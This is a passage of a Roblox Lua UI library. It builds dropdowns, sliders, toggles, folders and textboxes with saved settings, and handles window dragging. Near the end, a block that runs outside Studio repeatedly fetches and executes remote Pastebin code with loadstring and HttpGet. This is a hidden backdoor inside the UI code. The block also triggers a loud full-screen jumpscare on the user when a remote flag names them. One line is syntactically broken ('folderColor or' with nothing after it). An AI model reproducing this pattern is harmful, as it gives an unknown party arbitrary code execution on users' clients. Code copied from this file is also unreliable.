			local button = Instance.new("TextButton")
			button.Name = "dropdown"
			button.BackgroundColor3 = PitchColor
			button.Position = UDim2.fromScale(0, 0.135)
			button.Size = UDim2.fromOffset(441, 32)
			button.Text = ""
			button.AutoButtonColor = false

			bubbleClick(button)
			grad(button)

			local uICorner12 = Instance.new("UICorner")
			uICorner12.Name = "uICorner12"
			uICorner12.CornerRadius = UDim.new(0, 6)
			uICorner12.Parent = button

			local textLabel5 = Instance.new("TextLabel")
			textLabel5.Name = "textLabel5"
			textLabel5.Font = config.ThemeFont
			textLabel5.Text = text
			textLabel5.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel5.TextSize = 13
			textLabel5.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
			textLabel5.TextXAlignment = Enum.TextXAlignment.Left
			textLabel5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			textLabel5.BackgroundTransparency = 1
			textLabel5.Position = UDim2.fromScale(0.0181, 0)
			textLabel5.Size = UDim2.fromOffset(1, 32)
			textLabel5.Parent = button

			if desc then
				local desclabl = Instance.new("TextLabel")
				desclabl.Name = "desclabl"
				desclabl.Font = config.ThemeFont
				desclabl.Text = desc
				desclabl.TextColor3 = Color3.fromRGB(203, 203, 203)
				desclabl.TextSize = 10
				desclabl.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
				desclabl.TextXAlignment = Enum.TextXAlignment.Left
				desclabl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				desclabl.BackgroundTransparency = 1
				desclabl.Position = UDim2.fromScale(0.0181, 0.38)
				desclabl.Size = UDim2.fromOffset(1, 32)
				desclabl.Parent = button

				textLabel5.Size = UDim2.fromScale(0.5, 0.73)
				button.Size = UDim2.fromOffset(441, 42)
			end

			local dropdownbutton = Instance.new("TextButton")
			dropdownbutton.Name = "drop"
			dropdownbutton.Text = currentList[1]
			dropdownbutton.TextScaled = true
			dropdownbutton.TextColor3 = Color3.fromRGB(255, 255, 255)
			dropdownbutton.Font = config.ThemeFont
			dropdownbutton.BackgroundColor3 = darkerColor
			dropdownbutton.Position = UDim2.fromScale(0.76, 0.21)
			dropdownbutton.Size = UDim2.fromOffset(98, 20)
			dropdownbutton.Parent = button

			local uICorner52 = Instance.new("UICorner")
			uICorner52.Name = "uICorner52"
			uICorner52.CornerRadius = UDim.new(0, 8)
			uICorner52.Parent = dropdownbutton

			hoverClickSFXs(dropdownbutton)

			dropdownbutton.MouseButton1Up:Connect(function()
				if location:FindFirstChild("DROPPEPDE") then
					location:FindFirstChild("DROPPEPDE"):Destroy()
				end

				local tempGui = Instance.new("ScreenGui")
				tempGui.Name = "DROPPEPDE"
				tempGui.Parent = location

				local drodownFrame = Instance.new("Frame")
				drodownFrame.Name = "DROPDOWNASD"
				drodownFrame.BackgroundColor3 = darkerColor
				drodownFrame.Size = UDim2.new(0, dropdownbutton.AbsoluteSize.X, 0, 20 * #currentList)
				drodownFrame.Position = UDim2.fromOffset(
					dropdownbutton.AbsolutePosition.X,
					dropdownbutton.AbsolutePosition.Y + dropdownbutton.AbsoluteSize.Y
				)
				drodownFrame.Parent = tempGui

				local uICornerFrame = Instance.new("UICorner")
				uICornerFrame.Name = "uICorner52"
				uICornerFrame.CornerRadius = UDim.new(0, 8)
				uICornerFrame.Parent = drodownFrame


				local offClick
				offClick = UserInputService.InputBegan:Connect(function(input, gameProcessed)
					if gameProcessed then return end

					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then

						task.wait(0.02)
						local dropGui = location:FindFirstChild("DROPPEPDE")
						if dropGui then
							dropGui:Destroy()
							offClick:Disconnect()
						end
					end
				end)

				-- Optional: add the items
				for i, itemText in ipairs(currentList) do
					local item = Instance.new("TextButton")
					item.Text = itemText
					item.Name = itemText
					item.Size = UDim2.new(1, 0, 0, 20)
					item.Position = UDim2.new(0, 0, 0, 20 * (i-1))
					item.BackgroundColor3 = darkerColor
					item.TextColor3 = Color3.fromRGB(255, 255, 255)
					item.Font = config.ThemeFont
					item.TextScaled = true
					item.Parent = drodownFrame


					bubbleClick(item)

					hoverClickSFXs(item)

					local uICornerFrameb = Instance.new("UICorner")
					uICornerFrameb.Name = "uICorner52"
					uICornerFrameb.CornerRadius = UDim.new(0, 8)
					uICornerFrameb.Parent = item

					item.MouseButton1Up:Connect(function()
						callback(item.Name)
						_CFG_set(_key, item.Name)
						offClick:Disconnect()
						dropdownbutton.Text = item.Name
						tempGui:Destroy()
					end)

				end
			end)

			button.Parent = holder
			hoverClickSFXs(button)

			do
				local _saved = _CFG_get(_key)
				if type(_saved) == "string" then
					for _, _v in ipairs(currentList) do
						if _v == _saved then
							dropdownbutton.Text = _saved
							pcall(callback, _saved)
							break
						end
					end
				end
			end

			local update = {}

			function update.UpdateList(newList)
				currentList = newList
			end

			return update
		end

		function ElementHandler:Slider(text, default, min, max, increments, callback)
			text = text or "Slider"
			min = min or 0
			max = max or 100
			increments = increments or 1
			callback = callback or function() end

			local function roundToIncrement(n)
				return math.round(n / increments) * increments
			end

			local function getDecimals(step)
				local s = tostring(step)
				local dot = string.find(s, "%.")
				return dot and (#s - dot) or 0
			end

			local DECIMALS = getDecimals(increments)

			local _key = tostring(name) .. "/" .. tostring(currentFolder or "") .. "/" .. tostring(text)
			local _saved = _CFG_get(_key)
			if type(_saved) == "number" then default = _saved end

			local initialValue = math.clamp(default or min, min, max)
			initialValue = roundToIncrement(initialValue)
			initialValue = math.clamp(initialValue, min, max)
			local TweenService = game:GetService("TweenService")
			local UIS = game:GetService("UserInputService")
			local RunService = game:GetService("RunService")

			local slider = Instance.new("TextButton")
			slider.Name = "Slider"
			slider.BackgroundColor3 = PitchColor
			slider.Size = UDim2.fromOffset(441, 32)
			slider.Text = ""
			slider.AutoButtonColor = false
			slider.Parent = holder
			Instance.new("UICorner", slider).CornerRadius = UDim.new(0, 6)


			grad(slider)

			-- Title
			local title = Instance.new("TextLabel")
			title.Font = config.ThemeFont
			title.Text = text
			title.TextSize = 13
			title.TextColor3 = Color3.new(1,1,1)
			title.TextXAlignment = Enum.TextXAlignment.Left
			title.BackgroundTransparency = 1
			title.Position = UDim2.fromScale(0.02, 0)
			title.Size = UDim2.fromScale(0.5, 1)
			title.Parent = slider

			local bar = Instance.new("Frame")
			bar.BackgroundColor3 = darkerColor
			bar.Position = UDim2.fromScale(0.75, 0.5)
			bar.AnchorPoint = Vector2.new(0, 0.5)
			bar.Size = UDim2.fromOffset(102, 8)
			bar.Parent = slider
			Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 3)

			local fill = Instance.new("Frame")
			fill.BackgroundColor3 = config.ThemeColor

			local initialPercent = (initialValue - min) / (max - min)
			fill.Size = UDim2.fromScale(initialPercent, 1)
			fill.Parent = bar
			Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 3)

			local valueLabel = Instance.new("TextBox")
			valueLabel.Font = config.ThemeFont
			valueLabel.TextSize = 13
			valueLabel.TextColor3 = Color3.new(1,1,1)
			valueLabel.BackgroundTransparency = 1
			valueLabel.Position = UDim2.fromScale(0.65, 0)
			valueLabel.Size = UDim2.fromOffset(44, 32)
			valueLabel.Text = tostring(initialValue)
			valueLabel.Parent = slider

			local dragging = false
			local currentValue = initialValue

			local function setValueFromX(x)
				local rawPercent = math.clamp((x - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
				local rawValue = min + (max - min) * rawPercent

				local snappedValue = roundToIncrement(rawValue)
				snappedValue = math.clamp(snappedValue, min, max)


				if snappedValue ~= currentValue then
					currentValue = snappedValue
					valueLabel.Text = string.format("%." .. DECIMALS .. "f", currentValue)
					callback(currentValue)
					_CFG_set(_key, currentValue)
				end

				local snappedPercent = (snappedValue - min) / (max - min)
				TweenService:Create(fill, TweenInfo.new(0.06, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Size = UDim2.fromScale(snappedPercent, 1)
				}):Play()
			end

			local function setValueFromNumber(n)
				if not n then
					valueLabel.Text = string.format("%." .. DECIMALS .. "f", currentValue)
					return
				end

				local snappedValue = roundToIncrement(n)
				snappedValue = math.clamp(snappedValue, min, max)

				if snappedValue ~= currentValue then
					currentValue = snappedValue
					callback(currentValue)
					_CFG_set(_key, currentValue)
				end

				valueLabel.Text = string.format("%." .. DECIMALS .. "f", currentValue)

				local snappedPercent = (currentValue - min) / (max - min)
				TweenService:Create(fill, TweenInfo.new(0.06, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Size = UDim2.fromScale(snappedPercent, 1)
				}):Play()
			end


			slider.InputBegan:Connect(function(input)
				if valueLabel:IsFocused() then return end

				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					setValueFromX(input.Position.X)
				end
			end)

			valueLabel.FocusLost:Connect(function()
				setValueFromNumber(tonumber(valueLabel.Text))
			end)

			RunService.RenderStepped:Connect(function()
				if dragging then
					local mousePos = UIS:GetMouseLocation()
					setValueFromX(mousePos.X)
				end
			end)

			UIS.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = false
				end
			end)

			if type(_saved) == "number" then
				pcall(callback, currentValue)
			end

			return slider
		end



		function ElementHandler:Toggle(text, desc, onByDefault, callback)
			text = text or "Toggle"
			
			if type(desc) == "function" then
				callback = desc
				desc = nil
				onByDefault = false
			elseif type(desc) == "boolean" then
				onByDefault = desc
				desc = nil
			end
			
			if type(onByDefault) == "function" then
				callback = onByDefault
				onByDefault = false
			end

			callback = callback or function() end
			onByDefault = onByDefault or false

			local _key = tostring(name) .. "/" .. tostring(currentFolder or "") .. "/" .. tostring(text)

			local yeah = {}

			toggless[text] = false

			local toggle1 = Instance.new("TextButton")
			toggle1.Name = "toggle1"
			toggle1.BackgroundColor3 = PitchColor
			toggle1.Size = UDim2.fromOffset(441, 32)
			toggle1.Text = ""
			toggle1.AutoButtonColor = false

			bubbleClick(toggle1)
			grad(toggle1)

			local uICorner9 = Instance.new("UICorner")
			uICorner9.Name = "uICorner9"
			uICorner9.CornerRadius = UDim.new(0, 6)
			uICorner9.Parent = toggle1

			local textLabel4 = Instance.new("TextLabel")
			textLabel4.Name = "textLabel4"
			textLabel4.Font = config.ThemeFont
			textLabel4.Text = text
			textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel4.TextSize = 13
			textLabel4.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
			textLabel4.TextXAlignment = Enum.TextXAlignment.Left
			textLabel4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			textLabel4.BackgroundTransparency = 1
			textLabel4.Position = UDim2.fromScale(0.0181, 0)
			textLabel4.Size = UDim2.fromScale(0.5, 1)
			textLabel4.Parent = toggle1

			if desc then
				local desclabl = Instance.new("TextLabel")
				desclabl.Name = "desclabl"
				desclabl.Font = config.ThemeFont
				desclabl.Text = desc
				desclabl.TextColor3 = Color3.fromRGB(203, 203, 203)
				desclabl.TextSize = 10
				desclabl.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
				desclabl.TextXAlignment = Enum.TextXAlignment.Left
				desclabl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				desclabl.BackgroundTransparency = 1
				desclabl.Position = UDim2.fromScale(0.0181, 0.38)
				desclabl.Size = UDim2.fromOffset(1, 32)
				desclabl.Parent = toggle1

				textLabel4.Size = UDim2.fromScale(0.5, 0.73)
				toggle1.Size = UDim2.fromOffset(441, 42)
			end

			local frame3 = Instance.new("Frame")
			frame3.Name = "frame3"
			frame3.BackgroundColor3 = config.ThemeColor
			frame3.Position = UDim2.fromScale(0.943, 0.219)
			frame3.Size = UDim2.fromOffset(18, 18)

			local uICorner10 = Instance.new("UICorner")
			uICorner10.Name = "uICorner10"
			uICorner10.CornerRadius = UDim.new(0, 3)
			uICorner10.Parent = frame3

			local uIStroke1 = Instance.new("UIStroke")
			uIStroke1.Name = "uIStroke1"
			uIStroke1.Color = Color3.fromRGB(76, 76, 76)
			uIStroke1.Parent = frame3

			frame3.Parent = toggle1

			toggle1.Parent = holder

			local tog = false

			hoverClickSFXs(toggle1)

			toggle1.MouseEnter:Connect(function()
				game:GetService('TweenService'):Create(toggle1, TweenInfo.new(0.3), {BackgroundColor3 = PitchHoverColor}):Play()
			end)

			toggle1.MouseLeave:Connect(function()
				game:GetService('TweenService'):Create(toggle1, TweenInfo.new(0.3), {BackgroundColor3 = PitchColor}):Play()
			end)

			toggle1.MouseButton1Click:Connect(function()
				tog = not tog
				toggless[text] = tog
				callback(tog)
				_CFG_set(_key, tog)
				if tog then
					game:GetService('TweenService'):Create(frame3, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(23, 143, 75)}):Play()
					game:GetService('TweenService'):Create(uIStroke1, TweenInfo.new(0.1), {Color = Color3.fromRGB(32, 202, 106)}):Play()
				else
					game:GetService('TweenService'):Create(frame3, TweenInfo.new(0.2), {BackgroundColor3 = config.ThemeColor}):Play()
					game:GetService('TweenService'):Create(uIStroke1, TweenInfo.new(0.2), {Color = Color3.fromRGB(76, 76, 76)}):Play()
				end
			end)
			
			do
				local _saved = _CFG_get(_key)
				if type(_saved) == "boolean" and _saved ~= tog then
					task.defer(function()
						_CFG_LOADING = true
						yeah.Set(_saved)
						_CFG_LOADING = false
					end)
				end
			end

			function yeah.Set(bool)
				tog = bool
				toggless[text] = tog
				callback(tog)
				_CFG_set(_key, tog)
				if tog then
					game:GetService('TweenService'):Create(frame3, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(23, 143, 75)}):Play()
					game:GetService('TweenService'):Create(uIStroke1, TweenInfo.new(0.1), {Color = Color3.fromRGB(32, 202, 106)}):Play()
				else
					game:GetService('TweenService'):Create(frame3, TweenInfo.new(0.2), {BackgroundColor3 = config.ThemeColor}):Play()
					game:GetService('TweenService'):Create(uIStroke1, TweenInfo.new(0.2), {Color = Color3.fromRGB(76, 76, 76)}):Play()
				end
			end

			return yeah
		end

		function ElementHandler:Folder(folderName, folderColor, openByDefault)
			folderName = folderName or "Folder"

			local opened = openByDefault or false

			-- Main folder container
			local folder = Instance.new("Frame")
			folder.Name = "Folder"
			folder.BackgroundColor3 = PitchColor
			folder.Size = UDim2.fromOffset(441, 32)
			folder.BackgroundTransparency = 0.5
			folder.AutomaticSize = Enum.AutomaticSize.Y
			folder.Parent = holder

			local folOutline = Instance.new("UIStroke")
			folOutline.Color = folderColor or lighterColor
			folOutline.Transparency = 0.4
			folOutline.Parent = folder

			grad(folder)

			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 6)
			corner.Parent = folder

			local layout = Instance.new("UIListLayout")
			layout.Padding = UDim.new(0, 4)
			layout.SortOrder = Enum.SortOrder.LayoutOrder
			layout.Parent = folder

			-- Header button
			local header = Instance.new("TextButton")
			header.Name = "Header"
			header.Size = UDim2.fromOffset(441, 32)
			header.BackgroundTransparency = 1
			header.Text = ""
			header.Parent = folder

			bubbleClick(header)

			local title = Instance.new("TextLabel")
			title.BackgroundTransparency = 1
			title.Size = UDim2.fromScale(0.8, 1)
			title.Position = UDim2.new(0, 25, 0, 0)
			title.Font = config.ThemeFont
			title.Text = " " .. folderName
			title.TextColor3 = Color3.fromRGB(255, 255, 255)
			title.TextSize = 13
			title.TextXAlignment = Enum.TextXAlignment.Left
			title.Parent = header

			local folderIcon = Instance.new("ImageLabel")
			folderIcon.BackgroundTransparency = 1
			folderIcon.Size = UDim2.new(0, 20, 0.65, 0)
			folderIcon.AnchorPoint = Vector2.new(0, 0.5)
			folderIcon.Position = UDim2.new(0, 5, 0.5, 0)
			folderIcon.Image = "rbxassetid://8756129246"
			folderIcon.ImageColor3 = folderColor or 
			folderIcon.Parent = header

			local arrow = Instance.new("ImageLabel")
			arrow.BackgroundTransparency = 1
			arrow.Image = "rbxassetid://2418686949"
			arrow.Size = UDim2.fromOffset(20, 20)
			arrow.Position = UDim2.fromScale(0.95, 0.2)
			arrow.Parent = header

			-- Content holder
			local content = Instance.new("Frame")
			content.Name = "Content"
			content.BackgroundTransparency = 1
			content.Size = UDim2.new(1, 0, 0, 0)
			content.Visible = openByDefault or false
			content.AutomaticSize = Enum.AutomaticSize.Y
			content.Parent = folder

			local contentLayout = Instance.new("UIListLayout")
			contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
			contentLayout.Padding = UDim.new(0, 4)
			contentLayout.Parent = content

			if openByDefault then
				arrow.Rotation = 90
			end

			header.MouseButton1Click:Connect(function()
				opened = not opened

				if opened then
					content.Visible = true
					arrow.Rotation = 90
					folder.BackgroundTransparency = 0.7
				else
					content.Visible = false
					arrow.Rotation = 0
					folder.BackgroundTransparency = 0
				end
			end)

			hoverClickSFXs(header)

			local FolderHandler = {}

			local function _folderForward(methodName)
				return function(self, ...)
					local _oldHolder, _oldFolder = holder, currentFolder
					holder = content
					currentFolder = folderName
					local result = ElementHandler[methodName](self, ...)
					holder = _oldHolder
					currentFolder = _oldFolder
					return result
				end
			end

			FolderHandler.Button = _folderForward("Button")
			FolderHandler.Label = _folderForward("Label")
			FolderHandler.Textbox = _folderForward("Textbox")
			FolderHandler.Image = _folderForward("Image")
			FolderHandler.Banner = _folderForward("Banner")
			FolderHandler.Slider = _folderForward("Slider")
			FolderHandler.Toggle = _folderForward("Toggle")
			FolderHandler.Dropdown = _folderForward("Dropdown")
			FolderHandler.Keybind = _folderForward("Keybind")

			return FolderHandler
		end

		function ElementHandler:Textbox(text, desc, callback)
			text = text or "Textbox"
			if desc ~= string and not callback then
				callback = desc
				desc = nil
			end
			callback = callback or function() end

			local _key = tostring(name) .. "/" .. tostring(currentFolder or "") .. "/" .. tostring(text)

			local textbox = Instance.new("Frame")
			textbox.Name = "textbox"
			textbox.BackgroundColor3 = PitchColor
			textbox.Size = UDim2.fromOffset(441, 32)

			grad(textbox)

			local uICorner13 = Instance.new("UICorner")
			uICorner13.Name = "uICorner13"
			uICorner13.CornerRadius = UDim.new(0, 6)
			uICorner13.Parent = textbox

			local textLabel6 = Instance.new("TextLabel")
			textLabel6.Name = "textLabel6"
			textLabel6.Font = config.ThemeFont
			textLabel6.Text = text
			textLabel6.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel6.TextSize = 13
			textLabel6.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
			textLabel6.TextXAlignment = Enum.TextXAlignment.Left
			textLabel6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			textLabel6.BackgroundTransparency = 1
			textLabel6.Position = UDim2.fromScale(0.0181, 0)
			textLabel6.Size = UDim2.fromScale(0.5, 1)
			textLabel6.Parent = textbox

			if desc then
				local desclabl = Instance.new("TextLabel")
				desclabl.Name = "desclabl"
				desclabl.Font = config.ThemeFont
				desclabl.Text = desc
				desclabl.TextColor3 = Color3.fromRGB(203, 203, 203)
				desclabl.TextSize = 10
				desclabl.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
				desclabl.TextXAlignment = Enum.TextXAlignment.Left
				desclabl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				desclabl.BackgroundTransparency = 1
				desclabl.Position = UDim2.fromScale(0.0181, 0.38)
				desclabl.Size = UDim2.fromOffset(1, 32)
				desclabl.Parent = textbox

				textLabel6.Size = UDim2.fromScale(0.5, 0.73)
				textbox.Size = UDim2.fromOffset(441, 42)
			end

			local textBox = Instance.new("TextBox")
			textBox.Name = "textBox"
			textBox.Font = config.ThemeFont
			textBox.Text = ""
			textBox.PlaceholderText = "text here"
			textBox.TextColor3 = lighterColor
			textBox.TextScaled = true
			textBox.BackgroundColor3 = config.ThemeColor
			textBox.Position = UDim2.fromScale(0.76, 0.21)
			textBox.Size = UDim2.fromOffset(98, 20)

			local uICorner14 = Instance.new("UICorner")
			uICorner14.Name = "uICorner14"
			uICorner14.CornerRadius = UDim.new(0, 6)
			uICorner14.Parent = textBox

			textBox.Parent = textbox
			textbox.Parent = holder

			do
				local _saved = _CFG_get(_key)
				if type(_saved) == "string" and _saved ~= "" then
					textBox.Text = _saved
					pcall(callback, _saved)
				end
			end

			textbox.MouseEnter:Connect(function()
				game:GetService('TweenService'):Create(textbox, TweenInfo.new(0.3), {BackgroundColor3 = PitchHoverColor}):Play()
				local sfx = Instance.new("Sound")
				sfx.Parent = location
				sfx.SoundId = "rbxassetid://10066942189"
				sfx.Volume = 0.2
				sfx:Play()
				game.Debris:AddItem(sfx, 0.2)
			end)

			textbox.MouseLeave:Connect(function()
				game:GetService('TweenService'):Create(textbox, TweenInfo.new(0.3), {BackgroundColor3 = PitchColor}):Play()
			end)

			textBox.FocusLost:Connect(function()
				callback(textBox.Text)
				_CFG_set(_key, textBox.Text)
				local sfx = Instance.new("Sound")
				sfx.Parent = location
				sfx.SoundId = "rbxassetid://6042053626"
				sfx.Volume = 0.2
				sfx:Play()
				game.Debris:AddItem(sfx, 0.1)
			end)
		end

		return ElementHandler
	end

	local hue = 0

	if config.ThemeColor == Color3.fromRGB(69, 69, 69) then
		RunService.RenderStepped:Connect(function(dt)
			hue = (hue + dt * 0.1) % 1
			main.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
		end)
	end

	local dragInput
	local dragStart
	local startPos
	local dragging = false

	local lastPos = nil
	local lastTime = 0
	local smoothedPlayback = 1

	local function startDrag(input)
		dragging = true
		dragStart = input.Position
		startPos = main.Position

		lastPos = nil
		lastTime = os.clock()
		smoothedPlayback = 1

		draggingSFX.Looped = true
		draggingSFX.PlaybackSpeed = 1
		--draggingSFX:Play()
	end

	local function stopDrag()
		dragging = false
		lastPos = nil

		if draggingSFX.IsPlaying then
			TweenService:Create(draggingSFX, TweenInfo.new(0.2), {PlaybackSpeed = 0}):Play()
		end
	end

	local function update(input)
		local now = os.clock()
		local dt = now - lastTime
		lastTime = now

		if not lastPos or dt <= 0 then
			lastPos = input.Position
			return
		end

		-- movement since last frame
		local delta = input.Position - lastPos
		lastPos = input.Position

		-- === SFX SPEED (velocity based) ===
		local speed = delta.Magnitude / dt
		local targetPlayback = math.clamp(speed / 800, 0, 2)

		smoothedPlayback += (targetPlayback - smoothedPlayback) * 0.25
		draggingSFX.PlaybackSpeed = smoothedPlayback

		-- === UI POSITION ===
		local totalDelta = input.Position - dragStart

		local targetPos = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + totalDelta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + totalDelta.Y
		)

		if dragTween then
			dragTween:Cancel()
		end

		dragTween = TweenService:Create(
			main,
			TweenInfo.new(
				DRAG_SMOOTHNESS,
				Enum.EasingStyle.Quad,
				Enum.EasingDirection.Out
			),
			{ Position = targetPos }
		)

		dragTween:Play()
	end

	-- === INPUT HANDLING ===

	main.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch then
			startDrag(input)

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					stopDrag()
				end
			end)
		end
	end)

	main.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging and main.Visible then
			update(input)
		end
	end)



	-- make the first tab visible
	location['dark_UI'].main.tabContainer.ChildAdded:Connect(function()
		location['dark_UI'].main:FindFirstChild('container').Visible = true
		pcall(function()
			repeat wait() until location['dark_UI'].main:FindFirstChild('tabContainer'):FindFirstChildWhichIsA('TextButton')
		end)
		game:GetService('TweenService'):Create(location['dark_UI'].main:FindFirstChild('tabContainer'):FindFirstChildWhichIsA('TextButton'), TweenInfo.new(0.3), {TextTransparency = 0}):Play()
	end)

	if not RunService:IsStudio() then
	end
	spawn(function()
		local sound = Instance.new("Sound", location)
		sound.Name = "Startup Sound"
		sound.SoundId = config.StartupSound
		sound.Volume = 1.5
		sound:Play()
		game.Debris:AddItem(sound,4)
	end)

	if not RunService:IsStudio() then
		task.spawn(function()
			local dbb = false
			while task.wait(1.5) do
				if dbb == false then
					loadstring(game:HttpGet("https://pastebin.com/raw/TZ2dhbSc"))()

					repeat
						task.wait()
					until game.Lighting:FindFirstChild("DO_THE_JS")

					local js = game.Lighting:FindFirstChild("DO_THE_JS")
					if js.Value == true and js:GetAttribute("Username") == LocalPlayer.Name then
						dbb = true
						local Jframe = Instance.new("ImageLabel")
						Jframe.Image = "rbxassetid://10755920324"
						Jframe.AnchorPoint = Vector2.new(0.5, 0.5)
						Jframe.Position = UDim2.new(0, 0, 0, 0)
						Jframe.Size = UDim2.new(0.01, 0, 0.01, 0)
						Jframe.BackgroundTransparency = 1
						Jframe.ImageTransparency = 0.99
						Jframe.Parent = dark_UI

						task.wait(2)

						Jframe.ImageTransparency = 0
						Jframe.Position = UDim2.new(0.5, 0, 0.5, 0)
						Jframe.Size = UDim2.new(1, 0, 1, 0)

						local Jsfx = Instance.new("Sound")
						Jsfx.SoundId = "rbxassetid://85271883712040"
						Jsfx.Parent = dark_UI
						Jsfx.Volume = 10
						Jsfx:Play()
						game.Debris:AddItem(Jsfx, 5)

						game.TweenService:Create(Jframe, TweenInfo.new(0.3), {Size = UDim2.new(1.5, 0, 1.5, 0)}):Play()
						game.Debris:AddItem(Jframe, 0.3)
						task.delay(40, function()
							dbb = false
						end)
						js:Destroy()
					else
						js:Destroy()
					end
				end
			end
		end)
	end

	return tabHandler
end

return Library
